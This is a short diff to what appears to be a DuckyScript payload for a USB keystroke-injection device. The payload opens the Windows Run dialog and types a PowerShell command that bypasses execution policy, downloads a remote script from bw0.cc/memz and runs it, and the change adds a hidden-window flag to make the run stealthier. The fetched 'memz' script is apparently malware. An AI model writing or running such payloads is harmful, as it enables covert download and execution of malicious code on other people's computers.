@@ -11,7 +11,7 @@ REM open powershell (remove -W Hidden to show the window)
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -Ep Bypass -C irm https://bw0.cc/memz | iex
+STRING powershell -Ep Bypass -W H -C iex (irm bw0.cc/memz)
 ENTER
 
 
